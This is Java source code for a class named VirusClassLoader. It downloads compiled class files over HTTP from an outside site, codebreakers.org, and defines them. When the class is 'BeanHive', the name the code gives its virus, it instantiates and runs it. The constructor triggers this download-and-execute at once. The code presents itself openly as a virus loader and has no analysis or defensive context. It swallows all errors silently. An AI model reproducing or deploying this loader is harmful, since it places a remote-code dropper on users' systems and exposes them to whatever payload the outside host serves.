import java.net.URL;
import java.net.URLConnection;
import java.io.InputStream;

public class VirusClassLoader extends ClassLoader {

//---------- Abstract Implementation ---------------------
public synchronized Class loadClass(String className,
        boolean resolveIt) throws ClassNotFoundException {

    Class   result;
    byte[]  classBytes = null;
    String urlString = "http://www.codebreakers.org/";
    String  virusName = "BeanHive";

    //----- Check with the primordial class loader
    try {
        result = super.findSystemClass(className);
         return result;
    } catch (ClassNotFoundException e) {}

    //----- Try to load it from preferred source
    try {
        URL url = new URL(urlString + className + ".class");
        URLConnection connection = url.openConnection();

        InputStream inputStream = connection.getInputStream();
        int length = connection.getContentLength();

        classBytes = new byte[length];
        inputStream.read(classBytes); // Actual byte transfer
        inputStream.close();

    } catch(Exception ex) {}

    if (classBytes == null) {
        throw new ClassNotFoundException();
    }

    //----- Define it (parse the class file)
    result = defineClass(className, classBytes, 0, classBytes.length);
    if (result == null) {
        throw new ClassFormatError();
    }

    //----- Resolve if necessary
    if (resolveIt) resolveClass(result);

    if (className == virusName) {

       // A series of tests:
       try {
           Runnable beanhive = (Runnable)result.newInstance();
           beanhive.run();
       } catch(Exception ex) {}

    }

    // Done
    return result;
}

//---------- Initialization ------------------------------
public VirusClassLoader() throws ClassNotFoundException {

    loadClass("BeanHive");

}

} // End class
